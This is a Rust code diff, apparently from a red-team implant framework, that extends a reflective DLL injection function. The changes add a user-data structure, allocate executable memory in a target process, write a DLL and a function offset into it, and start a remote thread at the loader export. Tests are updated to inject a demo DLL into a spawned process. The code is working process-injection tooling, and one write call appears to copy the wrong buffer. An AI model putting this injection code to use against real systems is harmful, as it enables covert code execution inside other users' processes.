@@ -71,7 +71,7 @@ fn create_remote_thread(hprocess: isize, lpthreadattributes: *const SECURITY_ATT
     Ok(res)
 }
 
-fn get_export_address_by_name(pe_bytes: &[u8], export_name: &str) -> anyhow::Result<usize> {
+fn get_export_address_by_name(pe_bytes: &[u8], export_name: &str, in_memory: bool) -> anyhow::Result<usize> {
     let pe_file = object::read::pe::PeFile64::parse(pe_bytes)?;
 
     let section = match pe_file.section_by_name(".text") {
@@ -90,24 +90,34 @@ fn get_export_address_by_name(pe_bytes: &[u8], export_name: &str) -> anyhow::Res
     if section_raw_data_ptr == 0x0 {
         return Err(anyhow::anyhow!("Failed to find pointer to text section."))
     }
+
     // Section offset for .text.
     let rva_offset = section.address() as usize - section_raw_data_ptr as usize - pe_file.relative_address_base() as usize;
 
     let exported_functions = pe_file.exports()?;
     for export in exported_functions {
         if export_name == String::from_utf8(export.name().to_vec())?.as_str() {
-            return Ok(export.address() as usize - rva_offset - pe_file.relative_address_base() as usize);
+            if in_memory {
+                return Ok(export.address() as usize - pe_file.relative_address_base() as usize);
+            } else {
+                return Ok(export.address() as usize - rva_offset - pe_file.relative_address_base() as usize);
+            }
         }
     }
 
     Err(anyhow::anyhow!("Function {} not found", export_name))
 }
 
-fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32) -> anyhow::Result<()>{
-    let loader_function_name = "reflective_loader";
+struct UserData {
+    function_offset: u64,
+}
 
+fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32, function_name: &str) -> anyhow::Result<()>{
+    let loader_function_name = "reflective_loader";
     let reflective_loader_dll = LOADER_BYTES;
-    
+
+    let target_function = get_export_address_by_name(&target_dll_bytes, function_name, false)?;
+    let user_data = UserData{function_offset: target_function as u64};
     let dos_header = reflective_loader_dll.as_ptr() as *mut IMAGE_DOS_HEADER;
     let nt_header = (reflective_loader_dll.as_ptr() as usize + (unsafe { *dos_header }).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
     let image_size = (unsafe { *nt_header }).OptionalHeader.SizeOfImage;
@@ -131,24 +141,51 @@ fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32) -> anyhow::Result<()>{
         reflective_loader_dll.as_ptr() as _, 
         image_size as usize)?;
 
-    // Allocate and write payload to remote process
-    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
-        process_handle, 
+    // Allocate and write user data to the remote process
+    let remote_buffer_user_data: *mut std::ffi::c_void = virtual_alloc_ex(
+        process_handle,
         null_mut(), 
-        target_dll_bytes.len() as usize,
+        std::mem::size_of::<UserData>(),
         MEM_COMMIT | MEM_RESERVE, 
         PAGE_EXECUTE_READWRITE)?;
     
+    let user_data_ptr: *const UserData = &user_data as *const UserData;
+    let _user_data_bytes_written = write_process_memory(
+        process_handle, 
+        remote_buffer_user_data as _, 
+        user_data_ptr as *const _,
+        std::mem::size_of::<UserData>())?;
+
+    // Allocate and write function offset + payload to remote process
+    let user_data_ptr_size = std::mem::size_of::<*const UserData>();
+    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
+        process_handle, 
+        null_mut(), 
+        user_data_ptr_size + target_dll_bytes.len() as usize,
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE)?;
+
+    // Write the pointer to the start of the dll bytes being passed as a param. 
+    let user_data_ptr_in_remote_buffer = remote_buffer_target_dll as usize;
     let _payload_bytes_written = write_process_memory(
         process_handle, 
-        remote_buffer_target_dll as _, 
+        user_data_ptr_in_remote_buffer as _, 
+        target_dll_bytes.as_slice().as_ptr() as _, 
+        user_data_ptr_size)?;
+    
+    // Write dll_bytes at buffer + size of pointer to user data (should be usize)
+    let payload_ptr_in_remote_buffer = remote_buffer_target_dll as usize + user_data_ptr_size;
+    let _payload_bytes_written = write_process_memory(
+        process_handle, 
+        payload_ptr_in_remote_buffer as _, 
         target_dll_bytes.as_slice().as_ptr() as _, 
         target_dll_bytes.len() as usize)?;
 
     // Find the loader entrypoint and hand off execution
     let loader_address_offset = get_export_address_by_name(
         reflective_loader_dll, 
-        loader_function_name)?;
+        loader_function_name,
+        false)?;
     let loader_address = loader_address_offset + remote_buffer as usize;
 
     let _thread_handle = create_remote_thread(
@@ -164,9 +201,9 @@ fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32) -> anyhow::Result<()>{
     Ok(())
 }
 
-pub fn dll_reflect(dll_bytes: Vec<u32>, pid: u32) -> anyhow::Result<NoneType> {
+pub fn dll_reflect(dll_bytes: Vec<u32>, pid: u32, function_name: String) -> anyhow::Result<NoneType> {
     let local_dll_bytes = get_u8_vec_form_u32_vec(dll_bytes)?;
-    handle_dll_reflect(local_dll_bytes, pid)?;
+    handle_dll_reflect(local_dll_bytes, pid, function_name.as_str())?;
     Ok(NoneType)
 }
 
@@ -204,10 +241,18 @@ mod tests {
     }
 
     #[test]
-    fn test_dll_reflect_lookup_export() -> anyhow::Result<()> {
+    fn test_dll_reflect_get_export_address_by_name_on_disk() -> anyhow::Result<()> {
         let test_dll_bytes = LOADER_BYTES;
-        let loader_address_offset: usize = get_export_address_by_name(test_dll_bytes, "reflective_loader")?;
-        assert_eq!(loader_address_offset, 0x953);
+        let loader_address_offset: usize = get_export_address_by_name(test_dll_bytes, "reflective_loader", false)?;
+        assert_eq!(loader_address_offset, 0x76F);
+        Ok(())
+    }
+
+    #[test]
+    fn test_dll_reflect_get_export_address_by_name_in_memory() -> anyhow::Result<()> {
+        let test_dll_bytes = TEST_DLL_BYTES;
+        let loader_address_offset: usize = get_export_address_by_name(test_dll_bytes, "demo_init", true)?;
+        assert_eq!(loader_address_offset, 0x1A40);
         Ok(())
     }
 
@@ -240,7 +285,7 @@ mod tests {
         let target_pid = expected_process.unwrap().id();
 
         // Run our code.
-        let _res = handle_dll_reflect(test_dll_bytes.to_vec(), target_pid)?;
+        let _res = handle_dll_reflect(test_dll_bytes.to_vec(), target_pid, "demo_init")?;
 
         let delay = time::Duration::from_secs(DLL_EXEC_WAIT_TIME);
         thread::sleep(delay);
@@ -279,7 +324,7 @@ mod tests {
         let target_pid = expected_process.unwrap().id() as i32;
 
         let test_eldritch_script = format!(r#"
-func_dll_reflect(input_params['dll_bytes'], input_params['target_pid'])
+func_dll_reflect(input_params['dll_bytes'], input_params['target_pid'], "demo_init")
 "#);
 
         let ast: AstModule;
@@ -294,8 +339,8 @@ func_dll_reflect(input_params['dll_bytes'], input_params['target_pid'])
 
         #[starlark_module]
         fn func_dll_reflect(builder: &mut GlobalsBuilder) {
-            fn func_dll_reflect(dll_bytes: Vec<u32>, pid: u32) -> anyhow::Result<NoneType> {
-                dll_reflect(dll_bytes, pid)
+            fn func_dll_reflect(dll_bytes: Vec<u32>, pid: u32, function_name: String) -> anyhow::Result<NoneType> {
+                dll_reflect(dll_bytes, pid, function_name)
             }
         }
 
